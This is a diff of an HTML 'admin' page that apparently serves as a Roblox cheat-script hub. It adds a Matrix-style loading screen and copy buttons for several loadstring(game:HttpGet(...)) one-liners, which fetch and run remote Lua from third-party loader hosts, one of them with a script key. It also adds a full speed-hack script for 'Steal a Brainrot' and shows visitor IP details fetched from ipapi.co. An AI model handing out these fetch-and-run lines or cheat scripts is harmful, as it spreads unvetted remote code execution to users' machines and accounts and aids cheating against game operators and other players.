@@ -21,6 +21,8 @@
         position: relative;
         z-index: 1;
         display: flex;
+        opacity: 0;
+        transition: opacity 2s ease-in-out;
         height: 100vh;
         padding: 20px;
     }
@@ -34,6 +36,8 @@
     .left-panel {
         width: 60%;
         margin-right: 20px;
+        overflow-y: auto;
+        max-height: 90vh;
     }
     .right-panel {
         width: 40%;
@@ -45,21 +49,8 @@
         border: 1px solid #00ff7f;
         padding: 10px;
         margin-top: 10px;
-        position: relative;
         border-radius: 5px;
         background: rgba(0, 0, 0, 0.5);
-    }
-    .delete-btn {
-        position: absolute;
-        top: 5px;
-        right: 5px;
-        background: red;
-        color: white;
-        border: none;
-        padding: 3px 6px;
-        cursor: pointer;
-        border-radius: 50%;
-        font-weight: bold;
     }
     .copy-btn {
         background: #00ff7f;
@@ -68,79 +59,191 @@
         padding: 5px;
         cursor: pointer;
         margin-top: 5px;
-    }
-
-    /* Modern hacker input styles */
-    input[type="file"], textarea {
-        background: rgba(255, 255, 255, 0.9);
-        color: #000;
-        border: 2px solid #00ff7f;
-        border-radius: 6px;
-        padding: 8px;
-        font-family: monospace;
-        font-size: 14px;
-        outline: none;
-        width: 100%;
-        box-sizing: border-box;
-        transition: all 0.2s ease-in-out;
-    }
-    input[type="file"]:focus, textarea:focus {
-        box-shadow: 0 0 10px #00ff7f;
-        border-color: #00ff7f;
-    }
-    textarea {
-        min-height: 80px;
-        resize: vertical;
-    }
-
-    /* Hacker-styled post button */
-    button {
-        background: #000;
-        color: #00ff7f;
-        border: 2px solid #00ff7f;
-        padding: 8px 14px;
-        font-family: monospace;
-        font-size: 14px;
-        cursor: pointer;
-        border-radius: 6px;
-        transition: all 0.2s ease-in-out;
+        border-radius: 4px;
+        font-weight: bold;
     }
     button:hover {
-        background: #00ff7f;
-        color: #000;
-        box-shadow: 0 0 15px #00ff7f;
+        background: #00cc66;
+        color: #fff;
     }
 
-    /* Better post display image */
-    .post img {
-        max-width: 200px;
-        border-radius: 6px;
-        border: 2px solid #00ff7f;
-        margin-bottom: 5px;
+    /* LOADING SCREEN */
+    #loadingScreen {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: black;
+        z-index: 9999;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        overflow: hidden;
+        transition: opacity 2s ease-in-out;
+    }
+    #loadingScreen.hide {
+        opacity: 0;
+        pointer-events: none;
+    }
+    #loadingScreen canvas {
+        position: absolute;
+        top: 0; left: 0;
+    }
+    .popup {
+        position: relative;
+        background: rgba(0, 0, 0, 0.8);
+        color: #00ff00;
+        padding: 20px;
+        border: 2px solid #00ff00;
+        border-radius: 10px;
+        box-shadow: 0 0 20px #00ff00;
+        text-align: center;
+        animation: blink 1s infinite alternate;
+        z-index: 10000;
+    }
+    @keyframes blink {
+        from { opacity: 1; }
+        to { opacity: 0.6; }
     }
 </style>
 </head>
 <body>
 
-<canvas id="bg"></canvas>
+<!-- LOADING SCREEN -->
+<div id="loadingScreen">
+    <canvas id="matrix"></canvas>
+    <div class="popup">
+        <h1>ACCESS GRANTED</h1>
+        <p>Welcome to the system...</p>
+    </div>
+</div>
 
-<div class="container">
+<!-- MAIN CONTENT -->
+<canvas id="bg"></canvas>
+<div class="container" id="mainContent">
     <div class="left-panel">
-        <h1>Welcome Admin</h1>
-        <input type="file" id="imageInput" accept="image/*"><br><br>
-        <textarea id="textInput" placeholder="Enter your text"></textarea><br><br>
-        <button onclick="addPost()">Post</button>
-        <div id="posts"></div>
+        <h1>ADMIN = *ANDRO*</h1>
+
+        <!-- 10 Predefined Boxes -->
+        <div class="post"><p id="msg1">loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ffdfeadf0af798741806ea404682a938.lua"))()</p>steal a brainrot<button class="copy-btn" onclick="copyText('msg1')">Copy</button></div>
+        <div class="post"><p id="msg2">script_key="akEnDefdXsNxkQaWQldHGcjKqGRibhuM";
+premium=true;loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();</p>nathub<button class="copy-btn" onclick="copyText('msg2')">COPY</button></div>
+        <div class="post"><p id="msg3">loadstring(game:HttpGet("https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv1.3"))()</p>Arsenal<button class="copy-btn" onclick="copyText('msg3')">Copy</button></div>
+        <div class="post"><p id="msg4">--// Super Speed Toggle Script for Steal a Brainrot (Draggable Button)
+local UIS = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Character/Humanoid references
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+-- Speed settings
+local speedEnabled = false
+local SPEED = 50 -- Adjust speed as needed
+
+-- UI Setup
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SpeedToggleUI"
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ResetOnSpawn = false
+
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Size = UDim2.new(0, 120, 0, 40)
+ToggleButton.Position = UDim2.new(0, 10, 0, 100)
+ToggleButton.Text = "Super Speed: OFF"
+ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleButton.Font = Enum.Font.SourceSansBold
+ToggleButton.TextSize = 20
+ToggleButton.Parent = ScreenGui
+
+-- Make the button draggable
+ToggleButton.Active = true
+ToggleButton.Draggable = true
+
+-- Toggle speed on click
+ToggleButton.MouseButton1Click:Connect(function()
+	speedEnabled = not speedEnabled
+	ToggleButton.Text = "Super Speed: " .. (speedEnabled and "ON" or "OFF")
+end)
+
+-- Update character parts on respawn
+local function UpdateCharacterReferences()
+	Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	Humanoid = Character:WaitForChild("Humanoid")
+	HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+end
+
+-- Listen for character respawn
+LocalPlayer.CharacterAdded:Connect(function()
+	UpdateCharacterReferences()
+end)
+
+-- Speed logic
+RunService.RenderStepped:Connect(function()
+	if speedEnabled and Humanoid and HumanoidRootPart then
+		local moveDirection = Humanoid.MoveDirection
+		if moveDirection.Magnitude > 0 then
+			HumanoidRootPart.Velocity = moveDirection * SPEED + Vector3.new(0, HumanoidRootPart.Velocity.Y, 0)
+		end
+	end
+end)
+</p>steal a brainrot speed by me<button class="copy-btn" onclick="copyText('msg4')">Copy</button></div>
+        <div class="post"><p id="msg5">Suggest script</p><button class="copy-btn" onclick="copyText('msg5')">Copy</button></div>
+        <div class="post"><p id="msg6">suggest script</p><button class="copy-btn" onclick="copyText('msg6')">Copy</button></div>
+        <div class="post"><p id="msg7">Suggest script</p><button class="copy-btn" onclick="copyText('msg7')">Copy</button></div>
+        <div class="post"><p id="msg8">Suggest script</p><button class="copy-btn" onclick="copyText('msg8')">Copy</button></div>
+        <div class="post"><p id="msg9">suggest script</p><button class="copy-btn" onclick="copyText('msg9')">Copy</button></div>
+        <div class="post"><p id="msg10">Suggest script</p><button class="copy-btn" onclick="copyText('msg10')">Copy</button></div>
     </div>
 
     <div class="right-panel">
-        <h2>IP Information</h2>
+        <h2>IP ADRESS</h2>
         <pre id="ipInfo">Loading...</pre>
     </div>
 </div>
 
 <script>
-// Particle Background
+// ===== LOADING SCREEN MATRIX =====
+const canvasMatrix = document.getElementById("matrix");
+const ctxM = canvasMatrix.getContext("2d");
+canvasMatrix.height = window.innerHeight;
+canvasMatrix.width = window.innerWidth;
+const letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+const fontSize = 14;
+const columns = canvasMatrix.width / fontSize;
+const drops = [];
+for (let x = 0; x < columns; x++) drops[x] = 1;
+
+function drawMatrix() {
+    ctxM.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctxM.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);
+    ctxM.fillStyle = "#00ff00";
+    ctxM.font = fontSize + "px monospace";
+    for (let i = 0; i < drops.length; i++) {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctxM.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvasMatrix.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    }
+}
+setInterval(drawMatrix, 35);
+
+// Transition: fade out loading, fade in main
+setTimeout(() => {
+    const loading = document.getElementById("loadingScreen");
+    const main = document.getElementById("mainContent");
+
+    loading.classList.add("hide"); // fade out
+    main.style.display = "flex";
+    setTimeout(() => { 
+        main.style.opacity = 1; // fade in
+    }, 100);
+}, 5000);
+
+// ===== MAIN BACKGROUND PARTICLES =====
 const canvas = document.getElementById("bg");
 const ctx = canvas.getContext("2d");
 let particles = [];
@@ -170,9 +273,7 @@ class Particle {
 }
 function initParticles() {
     particles = [];
-    for (let i = 0; i < 80; i++) {
-        particles.push(new Particle());
-    }
+    for (let i = 0; i < 80; i++) particles.push(new Particle());
 }
 function connectParticles() {
     for (let a = 0; a < particles.length; a++) {
@@ -193,10 +294,7 @@ function connectParticles() {
 }
 function animateParticles() {
     ctx.clearRect(0, 0, canvas.width, canvas.height);
-    particles.forEach(p => {
-        p.update();
-        p.draw();
-    });
+    particles.forEach(p => { p.update(); p.draw(); });
     connectParticles();
     requestAnimationFrame(animateParticles);
 }
@@ -208,82 +306,19 @@ window.addEventListener("resize", () => {
 initParticles();
 animateParticles();
 
-// Post System with LocalStorage
-function loadPosts() {
-    const savedPosts = JSON.parse(localStorage.getItem("posts")) || [];
-    document.getElementById("posts").innerHTML = "";
-    savedPosts.forEach((post, index) => {
-        displayPost(post, index);
-    });
-}
-function displayPost(post, index) {
-    const div = document.createElement("div");
-    div.className = "post";
-
-    const del = document.createElement("button");
-    del.className = "delete-btn";
-    del.textContent = "X";
-    del.onclick = () => {
-        let posts = JSON.parse(localStorage.getItem("posts")) || [];
-        posts.splice(index, 1);
-        localStorage.setItem("posts", JSON.stringify(posts));
-        loadPosts();
-    };
-    div.appendChild(del);
-
-    if (post.image) {
-        const img = document.createElement("img");
-        img.src = post.image;
-        div.appendChild(img);
-    }
-    if (post.text) {
-        const p = document.createElement("p");
-        p.textContent = post.text;
-        div.appendChild(p);
-
-        const copy = document.createElement("button");
-        copy.className = "copy-btn";
-        copy.textContent = "Copy";
-        copy.onclick = () => {
-            navigator.clipboard.writeText(post.text);
-        };
-        div.appendChild(copy);
-    }
-    document.getElementById("posts").appendChild(div);
-}
-function addPost() {
-    const imageInput = document.getElementById("imageInput");
-    const textInput = document.getElementById("textInput");
-
-    const post = {};
-    if (imageInput.files[0]) {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            post.image = e.target.result;
-            post.text = textInput.value;
-            savePost(post);
-        };
-        reader.readAsDataURL(imageInput.files[0]);
-    } else {
-        post.text = textInput.value;
-        savePost(post);
-    }
-}
-function savePost(post) {
-    let posts = JSON.parse(localStorage.getItem("posts")) || [];
-    posts.push(post);
-    localStorage.setItem("posts", JSON.stringify(posts));
-    loadPosts();
+// ===== Copy Function =====
+function copyText(id) {
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text);
+    alert("Copied: " + text);
 }
 
-// IP Info
+// ===== IP Info =====
 fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
         document.getElementById("ipInfo").textContent = JSON.stringify(data, null, 2);
     });
-
-loadPosts();
 </script>
 
 </body>
